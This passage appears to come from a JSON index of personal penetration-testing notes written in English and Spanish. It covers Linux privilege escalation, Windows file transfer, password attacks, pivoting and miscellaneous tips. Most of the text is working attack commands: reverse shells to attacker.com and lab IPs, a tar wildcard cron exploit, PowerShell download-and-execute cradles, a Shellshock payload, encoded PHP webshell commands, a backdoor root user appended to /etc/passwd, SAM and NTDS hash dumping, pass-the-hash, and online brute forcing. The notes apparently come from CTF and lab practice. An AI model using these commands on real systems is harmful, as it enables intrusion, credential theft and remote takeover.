/dev/nul\n\nvi\n:set shell=/bin/sh\n:shell\n\n\npico\n# shell\nsudo pico\n^R^X\nreset; sh 1&gt;&amp;0 2&gt;&amp;0\n\nrvim\n# shell\nsudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\nsudo rvim -c ':lua os.execute(\"reset; exec sh\")'\n\n# reverse shell\non kali\nsocat file:`tty`,raw,echo=0 tcp-listen:12345\n\non box\nexport RHOST=attacker.com\nexport RPORT=12345\nrvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n\n\nperl\n# shell\nsudo perl -e 'exec \"/bin/sh\";'\n\n\ntclsh\n# shell\nsudo tclsh\nexec /bin/sh &lt;@stdin &gt;@stdout 2&gt;@stderr\n\n\ngit\n# shell\nPAGER='sh -c \"exec sh 0&lt;&amp;1\"' git -p help\nsudo PAGER='sh -c \"exec sh 0&lt;&amp;1\"' git -p help\n\n\nsudo git help config\n!/bin/sh\n\n\nscript\n# shell\nscript -q /dev/null\nsudo script -q /dev/null\n\n\nstrace\n\nsudo strace -o /dev/null /bin/bash\n\n \n2 HASH  in /etc/passwd\n\ncat /etc/passwd\ninsecurity:AzER3pBZh6WZE:0:0::/:/bin/sh\n\n\necho AzER3pBZh6WZE &gt; linisecurity\nhashcat -m 1500 -a 0 linsecurity rockyou.txt --force\n\n\n \n3 CRON , TAR, wildcard\n\n# 1\ncat /etc/crontab\n*/1 #### \\#   #### \\# #### \\# #### \\#   root    /etc/cron.daily/backup\n\n# 2\ncat /etc/cron.daily/backup\nfor i in $(ls /home); do cd /home/$i &amp;&amp; /bin/tar -zcf /etc/backups/home-$i.tgz *; done\n\n# 3 start listener\nnc -nlvp 443\n\n# 4 exploit tar wildcard use by cronjob\necho \"mkfifo /tmp/mini; nc 192.168.100.220 443 0&lt;/tmp/mini | /bin/sh &gt;/tmp/mini 2&gt;&amp;1; rm /tmp/mini\" &gt; /home/bob/shell.sh &amp;&amp; chmod +x /home/bob/shell.sh\necho \"\" &gt; \"--checkpoint-action=exec=sh shell.sh\"\necho \"\" &gt; --checkpoint=1\n\n \n4 find hidden files\n\nfind / -name \".*\" -type f -path \"/home/*\" 2&gt;/dev/null\n/home/susan/.secret\n\n \n5 SUID  1\n\n# find suid files\nfind / -perm -4000 -type f -exec ls -lah {} 2&gt;/dev/null \\;\n\n# xxd\nxxd \"/etc/shadow\" | xxd -r\n\n \n6 SUID 2\n\n# find suid files\nfind / -perm -4000 -type f -exec ls -lah {} 2&gt;/dev/null \\;\n\n# taskset\ntaskset 1 /bin/bash -p\n\n \n7 NFS\n\nshowmount -e 192.168.100.111\nmount 192.168.100.111:/home/peter /mnt/peter\n\nwe cant write to /mnt/peter (no_root_squash)\nBUT, we can create an user with the same  uid/gid que en el export, y asi escribir al volumen montado y subir unas ssh keys\n\ncheck uid y gid\nls -lan\n\n\ncreate user in kali\nroot@kali:/tmp/peter# groupadd -g 1005 peter\nroot@kali:/tmp/peter# adduser peter -uid 1001 -gid 1005\nroot@kali:/tmp/peter# su peter\n\nnow we have write access to the nfs volume\n \n8 DOCKER\n\nrootplease\ndocker run -v /:/hostOS -i -t chrisfosterelli/rootplease\n\n \n9 ver gtfobins\n\nhttps://gtfobins.github.io/\n \n10 systemd\n\ncheck\nls -la /lib/systemd/system/\ndebug.system is owned by peter\n\nchange\nthen we can change /lib/systemd/system/debug.system ExecStart= to a script that we want to run as root (ej reverseshell)\nrestart service\nprobably we need to reboot the box"
					}

					
				
			
		
			
				
					,
					

					"6-post-exploitation-4-0-windows-file-transfer": {
						"id": "6-post-exploitation-4-0-windows-file-transfer",
						"title": "windows file transfer",
						"category": "",
						"url": " /6-post-exploitation/4-0-windows-file-transfer/",
						"content": "INDEX\n\n\n\n  simple webservers\n  smbserver\n  tftp\n  ftp\n  SCP\n  VBScript\n  powershell\n  upgrade cmd to powershell\n\n\n0 simple webserver\n\n|  python 2.7\npython2 -m SimpleHTTPServer\n\n|  python3\npython3 -m http.server\n\n|  ruby\nruby -rwebrick -e \"WEBrick::HTTPServer.new(:Port =&gt; 8888, :DocumentRoot =&gt; Dir.pwd).start\"\n\n|  php\nphp -S 0.0.0.0:8888\n\n\n \n1 Smbsever (impacket)\n\nimpacket-smbserver  \n\n|  kali:\nsmbserver.py  myshare /tmp/smbshare -smb2\n\n|  windows:\nnet use M: \\\\&lt;kali-ip&gt;\\myshare\n\n|  Tmb se puede correr desde smb\n\\\\10.10.10.1\\privesc.exe  whoami\n\n\n \n2 TFTP\n\nNot the ideal file protocol, pero puede estar y lo podemos llegar a usar\n\nhacker\nrootkali: mkdir /tftp\nroot@kali: atftpd --daemon --port 69 \\tftp\\\nroot@kali: cp nc.exe \\tftp\n\n| target\nC:ProgramFiles\\SLmail\\System&gt; tftp -i 192.168.30.5 GET nc.exe\n\n\n \n3 FTP\n\nes interactivo el de windows, asi que no vamos a poder, pero el server ftp de windwos nos deja usar scripts :D\n\n| hacker\nroot@kali: apt-get install pure-ftpd\nroot@kali: cat setup-ftp\nroot@kali: ./setup-ftp\n\n\ncomands a poner en el archivo:\nroot@kali: cat ftp.commands\necho open 192.168.58.5 21 &gt; ftp.txt\necho offsec&gt;&gt; ftp.txt\necho lab&gt;&gt; ftp.txt\necho bin&gt;&gt; ftp.txt\necho GET evil.exe &gt;&gt; ftp.txt\necho bye &gt;&gt; ftp.txt\nftp -s:ftp.txt\n\n\n| target\nC:\\programs files\\slmail\\System&gt;  cop pyasteamos lo que esta aca arriba y deberia ejecutar todo\n\n \n4 SCP\n\nscp &lt;fileToUpload&gt; user@remote:/path\n\n \n5 VBScript\n\n\npara windows mas viejos\n\n|  script\n  echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs\n  echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs\n  echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs\n  echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs\n\n  echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs\n  echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs\n  echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs\n  echo Err.Clear &gt;&gt; wget.vbs\n\n  echo Set http = Nothing &gt;&gt; wget.vbs\n  echo Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") &gt;&gt; wget.vbs\n  echo If http is Nothing Then Set http = CreateObject(\"WinHttp.WinHttpRequest\") &gt;&gt; wget.vbs\n  echo If http is Nothing Then Set http = CreateObject(\"MSXML2.ServerXMLHTTP\") &gt;&gt; wget.vbs\n\n  echo If http is Nothing Then Set http = CreateObject(\"Microsoft.XMLHTTP\") &gt;&gt; wget.vbs\n  echo http.Open \"GET\", strUrl, False &gt;&gt; wget.vbs\n  echo http.Send &gt;&gt; wget.vbs\n\n  echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs\n  echo Set  http = Nothing &gt;&gt; wget.vbs\n  echo Set fs = CreateObject(\"Scripting.FileSystemObject\") &gt;&gt; wget.vbs\n  echo Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs\n\n  echo strData = \"\" &gt;&gt; wget.vbs\n  echo strBuffer = \"\" &gt;&gt; wget.vbs\n  echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs\n\n  echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs\n  echo Next &gt;&gt; wget.vbs\n  echo ts.Close &gt;&gt; wget.vbs\n\n\n| target\ncopy pasteamos el script\nC:\\program&gt;   dir wget.vbs &lt; para ver que se bajo\nC:\\program&gt; cscript wget.vbs http://192.168.30.5/exploit.exe exploit.exe\n\n\n \n6 PowerShell\n\n\n| Download File to path\npowershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile \"IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.14.5/JuicyPotato.exe','C:\\users\\merlin\\documents\\potato.exe')\"\n\n| desde url en el browser:\necho IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.3:8000/loli.txt','C:\\Users\\pelado\\Desktop\\loli.txt') | powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile\n\n\n| Download  testfile and executes it in the memory\npowershell.exe  -nop -ep bypass -c \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6/Invoke-PowerShellTcp.ps1')\"\n\n\n|powershell full path:\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nC:\\Windows\\Sysnative\\WindowsPowerShell\\v1.0\\powershell.exe\n\n\n| powershell wget\npowershell wget \"http://10.10.10.10/nc.exe\" -outfile \"nc.exe\"\nnc.exe -e cmd.exe 10.10.10.10 4444\n\n\nwget.psl\n| kali\n  echo $storageDir = $pwd &gt; wget.psl\n  echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.psl\n  echo $url = \"http://10.10.14.23:8000/PowerUp.ps1 &gt;&gt; wget.psl\n  echo $file = \"new-exploit.exe\" &gt;&gt;wget.psl\n  echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.psl\n\n\n| target:\nC:\\programs&gt; copy y pasteo lo de arriba\\\\\nC:\\programs&gt; powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.psl \\\\\nC:\\programs&gt; dir new-exploit.exe\\\\\n cool\\\\\n\n \n7 certutils\n\n| windows\ncertutil.exe -urlcache -split -f \"http://ip-addr:port/file\" [output-file]"
					}

					
				
			
		
			
				
					,
					

					"6-post-exploitation-4-3-passwords-hash-attacks": {
						"id": "6-post-exploitation-4-3-passwords-hash-attacks",
						"title": "passwords attacks",
						"category": "",
						"url": " /6-post-exploitation/4-3-passwords+hash_attacks/",
						"content": "1 Preparing for brute force\n\n\nIdentify hash\nhash-identifier\n\ncrunch\n| crear passwords de 6 digitos con valores hasta f (112MB)\n\n root@kali: crunch 6 6 0123456789ABCDEF -o list.txt\n\n| crear algo mas comun CON CHARACTER SETS (34 MB)\n crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha -o mixedalpha.txt\n\n\n\ncewl\n| podemos usar palabras y frases de la pagina web de la empresa para generar una lista.\n    root@kali: cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt\n\n\n| create custom dic\n\n  usamos john para modificar las palabras que bajamos.\n     root@kali: vim /etc/john/john.conf\n root@kali: john --wordlist=megacorp-cewl.txt --rules --stdout&gt;mutated.txt\n    \n  \n\n\n2 WINDOWS DUMP\n\n\nSAM\nThe Security Account Manager (SAM) is a database file[1] in Windows XP, Windows Vista, Windows 7, 8.1 and 10 that stores users’ passwords.\n\nlocation:\n/windows/system32/config/SAM\n\nThe user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash\n\nLM NTLM NET-NTLMv2 hashes\n\nNTLM:\nNTLM hashes are stored in the Security Account Manager (SAM) database and in the Domain Controller’s NTDS.dit database.\n\n  from 1\n     aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42\n lmhas                           :  ntlmhash\n    \n  \n  form 2\n    Administrator:500:aad3b435b51404eeaad3b435b51404ee:214e90b41e2752d80acd34e13f3e9831:::\nusername     :userid:        lmhash               :         ntlmhash  :::\n    \n    The LM hash is the one before the semicolon (:) and the NT hash is the one after the semicolon. Starting with Windows Vista and Windows Server 2008, by default, only the NT hash is stored.\n  \n\n\n** Net-NTLMv1/v2**\nNet-NTLM hashes are used for network authentication (they are derived from a challenge/response algorithm and are based on the user’s NT hash). Here is an example of a Net-NTLMv2 (a.k.a NTLMv2) hash:\n   admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030\n\n\nvolatility\nRetrieve a user’s password from a memory dump you need to know the OS\n| 1. check profile type of the memory dump (ex: Win7SP1x86):\nvolatility imageinfo -f memorydumpfilename.raw\n\n| 2. get the hive list so we can get the starting location in memory of where the registry information resides:\nvolatility hivelist -f memdumpfilename.raw --profile=Win7SP1x86\n0x9aad6148 0x131af148 \\SystemRoot\\System32\\Config\\SAM\n0x8b21c008 0x039ef008 \\REGISTRY\\MACHINE\\SYSTEM\n\n\n  0x9aad6148, 0x8b21c008\n\n\n| 3. dump the hashes\n\nvolatility -f memorydumpfilename.dmp --profile=Win7SP1x86 hashdump -y 0x8b21c008 -s 0x9aad6148 &gt; hashes.txt\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::\n\n\n| 4. pass the hash\nwith pth-winexe:\nroot@kali: pth-winexe -U administrator%hash //192.168.31.233 cmd\n\nwith psexec.py:\npsexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 htb/administrator@10.10.10.161 cmd.exe\n\n\npwdump and fgdump\n\n\n  PWdump.exe can be used to crack local SAM hashes in memory. Does not have the added bonus like FGdump of disabling antivirus. This will need to be done prior to running the program\n    pwdump.exe (host)\n    \n  \n  fgdump.exe can be used to crack local SAM hashes in memory. The program uses the IPC$ share to connect and additionally attempts to disable antivirus that may be running on the host\n    fgdump.exe, then \"type 127.0.0.1.pwdump\"\n    \n    pwdump sam drump hashes\n\n    root@kali:/mnt/vhd/Windows/System32/config: pwdump SYSTEM SAM\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nL4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::\n\n    \n  \n\n\nWCE windows credential editor\nwce32.exe (wce64.exe) can be used to attempt cracking of user passwords in memory, windows xp, vista, 2003, 7 y 2008\nwce can be use to pass the hash.\nYou need local administrator privileges to run WCE and be able to steal NTLM credentials from memory. This is a post-exploitation tool.\n   c:\\user&gt; wce64.exe -w\n   c:\\user&gt; wce32.exe -w\n\n\npassing the hash\n\nnltm hash se puede usar en lugar deun clear text\n\n  root@kali: vim hashes.txt\n\nremplazamos el no password por otra cosa y despues exportamos ese hash\n  root@kali: export SMBHASH=saras...asdas\n  root@kali: pth-winexe -U administrator%hash //192.168.31.233 cmd\n  psexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 htb/administrator@10.10.10.161 cmd.exe\n\nex:\n  pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd\n\n\nYou CAN perform Pass-The-Hash attacks with NTLM hashes.\nYou CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes.\nYou CAN attack net-ntlmv2 with responder with LLMNR Poisonin\n\n3 Active Directory\n\nMisconfigured AD\n\nnet use z: \\\\(target_hostname)\\SYSVOL\ndir /s Groups.xml\ntype Z:\\local.domain\\Policies\\{84583021-C460-486C-83E1- FA1EC8CA84FC}\\Machine\\Preferences\\Groups\\Groups.xml\ngpp-decrypt SvtusBQWJgAFrFPTyPH9clizXPQBDqDDGzlSDxKogcz, password will be outputted\n\n\nAD password audit\nThe psexec_ntdsgrab module will be used to create Volume Shadow Copies of the ntds.dit and SYSTEM hive and grab them from the domain controller. It requires domain administrator credentials.\n\ncrea 2 archivos uno .dit y otro .bin\n\nextract hashes\n  ./impacket/examples/secretsdump.py -ntds /home/lab/.msf4/loot/[blah]_psexec.ntdsgrab._104930.dit -system /home/lab/.msf4/loot/[blah]_psexec.ntdsgrab._438132.bin -hashes lmhash:nthash LOCAL -outputfile ntlm_hashes\n\n\n4 Online passwords attack\n\npara tratar de conectarse a http ssh ftp, etc, hay que mandar varios request al server\\\n\ntools:medusa hydra ncrack\n\nmedusa\nroot@kali: medusa -h 192.168.31.219 -u admin -P password-file.txt -M http -m DIR:/admin -T 20\n\n\ncrowbar (rdesktop)\nfor example for rdesktop\ncrowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1\n\n\nhydra\n\n  ej:\n    hydra –l (found_name) –P password.lst 192.168.168.168 ssh\nhydra -L username_list.txt -P password_list.txt 192.168.168.168 ssh -t 4\n-l user\n-L list of user\n-p password\n-P list of passwords\n    \n  \n  HTTP post form\n    hydra -L &lt;wordlist&gt; -P&lt;password list&gt; &lt;IP&gt; http-post-form \"&lt;file path&gt;:username=^USER^&amp;password=^PASS^&amp;Login=Login:&lt;fail message&gt;\"\n    \n  \n\n\nncrack\n\nsirve mucho para romper rdp\n   root@kali: ncrack -v -f --user administrator -P password-file.txt rdp://192.168.31.233,CL=1\n\n\n5 Offline passwords attack\n\n\nJohn the ripper\n\nroot@kali:~# john  hashes.txt\n\nroot@kali:~# john --format=nt windowshashes.txt --wordlist=passwords.txt\nroot@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 password_list\n\n\n\nssh keys bruteforce\n2496  python /usr/share/john/ssh2john.py  matt_rsa  &gt; matt.hash\n2500  john --wordlist=rockyou.txt  ~/.ssh/matt.hash\n\n\nunshadow\n\n  ex:\n     unshadow password_file shadow_file &gt; new_password_list\n    \n  \n\n\noclhashcat ntlm sam hash from pwdump\n\n  suponiendo:\n\n\ncat hash-nolimpio.txt\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:214e90b41e2752d80acd34e13f3e9831:::\nusername :  userid : lmhash : ntlmhash\ncat hashes.txt\n&gt; 214e90b41e2752d80acd34e13f3e9831\n\n\n\n  corremos:\n    root@kali:~# hashcat -m 1000 -a 0  --force hashes-bastion/hashes.txt  rockyou.txt  \n    \n  \n\n\nmd5 hashcat\nI put this $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ into a .txt file and the following command: hashcat -m 500 -a 0 --force davidHash '/root/Desktop/rockyou.txt'\n\n\nonline hash crackers\n\n  Hashkiller (Windows/NTLM):\n    https://hashkiller.co.uk/ntlm-decrypter.aspx\n  Crackstation (MD5):\n    https://crackstation.net\n  Offensive security (MD5):\n    http://cracker.offensive-security.com\n\n\ncracking ntlm hashes SAM dump\n| lm\n299BD128C1101FD6\n\njohn --format=lm hash.txt\nhashcat -m 3000 -a 3 hash.txt\n\n\n| NTHash\nB4B9B02E6F09A9BD760F388B67351E2B\n\njohn --format=nt hash.txt\nhashcat -m 1000 -a 3 hash.txt\n\n\n| NTLMv1 (A.K.A. Net-NTLMv1)\nu4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c\n\njohn --format=netntlm hash.txt\nhashcat -m 5500 -a 3 hash.txt\n\n\n| NTLMv2 (A.K.A. Net-NTLMv2)\nadmin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030\n\njohn --format=netntlmv2 hash.txt\nhashcat -m 5600 -a 3 hash.txt\n\n\n6 ZIP\n\nfcrackzip\n fcrackzip -v -u -D -p \"rockyou.txt\" /root/hackthebox/node/myplace-backup.zip"
					}

					
				
			
		
			
				
					,
					

					"6-post-exploitation-4-4-pivoting-tunneling": {
						"id": "6-post-exploitation-4-4-pivoting-tunneling",
						"title": "pivoting+tunneling",
						"category": "",
						"url": " /6-post-exploitation/4.4-pivoting+tunneling/",
						"content": "PORT FORWARDING “port to port”:\n\nMSF\nMost platforms\n\nForward:\nGet meterpreter session on one of the dual homed machines\nportfwd add -l 4445 -p 4443 -r 10.1.1.1\nUse -R to make it reverse\n\nSSH\n| in kali\n-R 8081:172.24.0.2:80 (on my Kali machine listen on 8081, get it from 172.24.0.2:80)\n\n\n  &lt;KALI 10.1.1.1&gt;:8081&lt;————&lt;REMOTE 172.24.0.2&gt;:80\n\n\nNow you can access 172.24.0.2:80, which you didn’t have direct access to\n\n-L 8083:127.0.0.1:8084 (on your machine listen on 8083, send it to my Kali machine on 8084)\n\n\n\n  &lt;KALI 127.0.0.1&gt;:8084&lt;————&lt;REMOTE 10.1.1.230&gt;:8083&lt;————:XXXX\n\n\nrun nc on port 8084, and if 10.1.1.230:8083 receives a reverse shell, you will get it\n\n| For reverse shell:\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=10.1.1.230 LPORT=8083 -f exe -o shell\n\nRun it on 2nd remote target to get a shell on Kali\n\nOr if you didn’t have an SSH session, then SSH to your Kali from target machine:\nOn Kali: service ssh start “add a user, give it /bin/false in /etc/passwd”\nssh - -R 12345:192.168.122.228:5986 test@10.1.1.1\n\n\nPLINK\nJust like SSH, on Windows\nservice ssh start , and transfer /usr/share/windows-binaries/plink.exe to the target machine\n\nOn Target:\n plink.exe 10.1.1.1 -P 22 -C -N -L 0.0.0.0:4445:10.1.1.1:4443 -l KALIUSER -pw PASS\n\n\nSOCAT\nFor linux\n\nForward your 8083 to 62.41.90.2:443\n./socat TCP4-LISTEN:8083,fork TCP4:62.41.90.2:443\n\n\nCHISEL\nMost platforms\n\nRemote static tunnels “port to port”:\n\nOn Kali “reverse proxy listener”:\n./chisel server -p 8000 -reverse\n\nGeneral command:\n./chisel client &lt;YOUR IP&gt;:&lt;YOUR CHISEL SERVER PORT&gt; L/R:[YOUR LOCAL IP]:&lt;TUNNEL LISTENING PORT&gt;:&lt;TUNNEL TARGET&gt;:&lt;TUNNEL PORT&gt;\n\n\nRemote tunnels “access IP:PORT you couldn’t access before”:\nOn Target:\n./chisel client 10.1.1.1:8000 R:127.0.0.1:8001:172.19.0.3:80\n\n\nLocal tunnels “listen on the target for something, and send it to us”:\nOn Target:\n./chisel client 10.1.1.1:8000 9001:127.0.0.1:8003\n\n\n \n \nDYNAMIC “port to any”:\n\nsetup proxychains with socks5 on 127.0.0.1:1080\nOr set up socks5 proxy on firefox\nFor nmap use -Pn -sT or use tcp scanner in msf\n\nMSF\nMost platforms\n\nGet meterpreter session on one of the dual homed machines\nAuto route to 10.1.1.0 (multi/manage/autoroute)\nStart socks proxy (auxiliary/server/socks4a)\n\nSSH\nFor Linux\n-D1080\n\n\nPLINK\nJust like SSH, on Windows\nOn Target:\n plink.exe 10.1.1.1 -P 22 -C -N -D 1080 -l KALIUSER -pw PASS\n\n\nCHISEL\nMost platforms\n\nOn Kali:\n./chisel server -p 8000 -reverse\n\nOn Target:\n./chisel client 10.1.1.1:8000 R:8001:127.0.0.1:1080\n./chisel server -p 8001 --socks5\n\n\nOn Kali:\n./chisel client 127.0.0.1:8001 socks\n\n\n \n \nEXAMPLE\n\nc:&gt; mstsc (el rdesktop de windows)\n\nsupongamos que tenemos un target (lopez) que queremos conectar a un server (w2003 67.23.72.109) por mstsc, el firewall de lopez deja salir paketes solo por el puerto 80, para poder usar el puerto 3389  vamos a necesitar otra maquina que nos haga de proxy(kali  208.88.127.99)\n\nPasos\n\n1 En Kali usamos rinetd\n\n  root@kali: vim /etc/rinetd.conf\n  #bindaddress     bindport  connectaddress    connectport\n  208.88.127.99   80          67.23.72.109   3389\n  root@kali: /etc/init.d/rinetd restart\n\n\n2  desde lopez nos conectamos a nuestro proxy machine en mstsc\n\n3  profit\n\n \n \n\nrdesktop case\n\ntengo shell en una windows box interna no routeable y le hice descargar plink\n\n\n  Nos conectamos con putty(plink) a nuestra kali(.99) y redirigimos el puerto 3389 en windows al 3390 en kali\n    C:&gt; Plink -l root -pw uberpass  208.88.127.99 -R 3390:127.0.0.1:3389   \n    \n    root@kali:netsta -antl | grep LISTENING &lt;-nos deberia mostrar el 3390 escuchando\n    \n  \n\n\n#abrimios otra terminal y dejamos esa abierta que esta tuneleando\n  root@kali: rdesktop 127.0.0.1:3390  &lt;- nos deberia mostrar el remote desktop de windows\n\n\n\nPROXYCHAINS\n\n\n  root@kali:ssh -D 8080 root@admin.megacorpone.com\n  root@admin: ifconfig (172.16.40.10)\n\n\n#primero configuramos proxychains para que use el socks 8080\n  root@kali: proxychains &lt;tool&gt;\n  ex:\n  root@kali: proxychains nmap -p 3389 -sT -Pn 172.16.40.18-29 --open\n  |s-CHAINS| ..... BLABLA\n  ...\n  (172.168.40.20)\n  3389 open\n  root@kali: proxychains rdesktop 172.168.40.20\n\n\n\nhttps://hkashfi.blogspot.com.ar/2008/04/bypassing-firewalls-with-port_23.html"
					}

					
				
			
		
			
				
					,
					

					"7-varios-tips": {
						"id": "7-varios-tips",
						"title": "tips",
						"category": "",
						"url": " /7-varios/tips/",
						"content": "stderr y stdout\na veces los comandos por ejemplo en shellshock salen por stderr asi que tenemos que redireccionar stdout a stderr ex:\nroot@kali:~# curl -H \"User-Agent: () { :; }; /bin/bash -c 'echo aaaa; nc  -h 2&gt;&amp;1; echo zzzz;'\" http://10.11.1.71/cgi-bin/admin.cgi -s \\\n\n\nunzip with python\n#!/usr/bin/env python3\nimport sys\nfrom zipfile import PyZipFile\nfor zip_file in sys.argv[1:]:\n    pzf = PyZipFile(zip_file)\n    pzf.extractall()\n\n\nurlencode webshell request with curl\ncurl -X POST http://10.10.10.143/pwned.php --data-urlencode ​ 'exec=bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.4/1234 0&gt;&amp;1\"'\n\n\nrun bash commands from powershell (wut)\nPS C:\\windows&gt; bash -c \"command\"\n\n\nFTP\nbajar archivos con tipo binario porque los rompe sino\nftp&gt; type binary\nftp&gt; get backup.mdb\n\n\npowershell hidden files\ndir -Force\n\ndata stream\ndir /R\nhm.txt:root.txt:$DATA\n\n​powershell Get-Content -Path \"hm.txt\" -Stream \"root.txt\"\n\nmore &lt; hm.txt:root.txt\n\n\nrdp\nrdesktop -g 85% -r disk:share=/var/www -r clipboard:CLIPBOARD -u username -p password 10.10.10.10\n\n\nif can run as sudo but dont have shell\necho 'toor:aaKNIEDOaueR6:0:0:toor:/root:/bin/bash' &gt;&gt; /etc/passwd\n\nIt will create a new root user with the password “foo”. The encrypted password was generated with: perl -le ‘print crypt(“foo”, “aa”)’. You can then easily elevate to a root shell with su toor.\n\nlocalgroup Administrators offsec /add\n\nthis only work for old windows in modern execute a reverse shell might be the best idea\n\nclean carriage return from scripts\nsed -i -e ‘s/\\r$//’ &lt;script name&gt;\n\n\nsteghide steganofrafia\nusalo para sacar por ejemplo ssh que esten en una imagen\nsteghide extract -sf archivo.png\n\n\npading oracle attack\n\nsuid\nsi no tiene full path en sudo -l podemos hijackearlo cambiando el path\n\nBecause a full path to the cat binary is not specified, this specific command is vulnerable to\nhijacking by modifying the ​ PATH​ system variable. This can be achieved by setting the working\ndirectory as the first option in PATH, with the command ​ export PATH=.:$PATH\nAfter this, creating a file named ​ cat​ in the working directory will cause the file to be executed by\nthe root user. In this case, a bash script will do the trick. Note, do not use the ​ cat​ command in the\nscript as this will cause the script to loop endlessly. Don’t forget to ​ chmod +x ./cat​ before running\nthe backup binary. The script below creates a copy of the root flag in the home directory.\n\nIPV6 ?\n\nunix wildcards\nhttps://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt\n\nwindows php cookies\nPHP stores the session files in C:\\Windows\\TEMP in the format sess_ . In order to read\nour session file we will use the session ID we acquired. In this case the session file would be\nsess_923nktm0vmmi12qrptls332t5o . Let's see if we can read it\nReplace everything after sess_ with your own cookie value.\ncurl -X GET http://10.10.10.151/blog/?\nlang=/windows/temp/sess_923nktm0vmmi12qrptls332t5o\n\nf we can create a username containing PHP code, we could potentially gain RCE. Consider the\nfollowing as a username.\n&lt;?=`powershell whoami`?&gt;\n\n\nbypass blacklisting chars\necho \"wget http://10.10.14.23/nc.exe -o C:\\\\Windows\\\\TEMP\\\\nc.exe\" | iconv -t\nUTF-16LE | base64\n\n&lt;?=`powershell /enc\ndwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAzAC8AbgBjAC4AZQB4AGUA\nIAAtAG8AIABDADoAXABXAGkAbgBkAG8AdwBzAFwAVABFAE0AUABcAG4AYwAuAGUAeABlAAoA`?&gt;\n\n\nprocdump\n\nexpress using jwt token\n\n  get the token\n    curl -s -X POST  http://10.10.10.137:3000/login -d \"username=admin&amp;password=pas111223\" | jq\n    \n  \n  use the token\n    curl -s http://10.10.10.137:3000/ -H ​ 'Authorization: Bearer\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNT\nU4ODU1NTYzLCJleHAiOjE1NTg5NDE5NjN9.s7ZbrqwW--H6Ae-UWs3VeO21U2XRwfNEDeL0gAYI\npX0'​ | jq\n    \n  \n\n\nINODES\nif you own the directory but not the file, you can move it and create another one with the same name\n\ndisk permision\nif you have disk permission you can use\ndebugfs /dev/sda1\ndebugfs: cat /root/.ssh/id_rsa\n\npowershell thruogh ftp when restricted\n echo !powershell.exe &gt; ftpcommands.txt &amp;&amp; ftp -s:ftpcommands.txt\n\nweird dependencies location\nfor example :\nAs gcc is not available on the target machine, the exploit must be compiled locally. LinEnum\npreviously identified ​ /home/decoder/test​ as world-writable and can be used to drop the binary.\nAttempting to run the exploit without modification will fail as the target is missing ​ /etc/lsb-release​ .\nSimply changing references of ​ /etc/lsb-release​ to ​ /home/decoder/test/lsb-release​ is sufficient.\n\nDUMP HASHES\nreg save hklm\\sam c:\\sam\nreg save hklm\\system c:\\system\npython /usr/share/doc/python-impacket/examples/secretsdump.py -sam 